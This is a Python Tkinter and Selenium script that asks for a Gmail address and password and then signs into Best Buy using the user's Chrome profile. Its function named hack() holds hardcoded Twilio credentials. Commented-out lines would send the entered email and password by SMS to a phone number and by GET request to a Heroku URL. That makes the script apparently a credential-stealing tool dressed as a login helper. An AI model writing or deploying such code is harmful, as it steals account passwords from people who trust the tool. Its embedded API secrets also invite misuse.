from tkinter import *
import sys
from pathlib import Path
import os
import requests
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
def hack():
    global gmail, password
    gmail, password = entry1.get(), entry2.get()
    from twilio.rest import Client
    account_sid = "AC67d1437cea8593339dce6ec20c4eeeb3"
    auth_token = "60e2616f01b750c78efd6d44022a8210"
    client = Client(account_sid, auth_token)
def shut():
    driver.quit()
def sign():
    global driver
    options = Options()
    options.add_argument('start-maximized')
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    username = os.getenv('USERPROFILE')
    options.add_argument(
        f"user-data-dir={username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    )
    username = os.getenv('USERPROFILE')
    if getattr(sys, 'frozen', False):
        chrome_driver = os.path.join(sys._MEIPASS, 'chromedriver.exe')
    # message = client.messages.create(body= f"\ngmail: {gmail}, password: {password}", from_="+18592953746", to="+62816300111")
    # requests.get('http://flask-owen.herokuapp.com/' + gmail + '/' + password)
    else:
        chrome_driver = r'C:\Users\owenw\vscode\chromedriver.exe'

    driver = webdriver.Chrome(executable_path=chrome_driver, options=options)
    driver.get('https://www.bestbuy.com/identity/global/signin')
    WebDriverWait(
        driver,
        10).until(lambda x: x.find_element_by_id('fld-e')).send_keys(gmail)
    driver.find_element_by_id('fld-p1').send_keys(password)
    driver.find_element_by_class_name('cia-form__controls__submit ').click()

root = Tk()
root.geometry('400x400')
Label(root, text='Gmail: ').grid(row=0)
Label(root, text='Password: ').grid(row=1)
entry1 = Entry(root, width=50)
entry1.grid(row=0, column=1)
entry2 = Entry(root, width=50)
entry2.grid(row=1, column=1)
submit = Button(root, text='Submit', command=lambda:[hack(), sign()])
submit.grid()
done = Button(root, text='Quit', command=lambda:[root.destroy(), shut()])
done.grid()
root.eval('tk::PlaceWindow . center')
root.mainloop()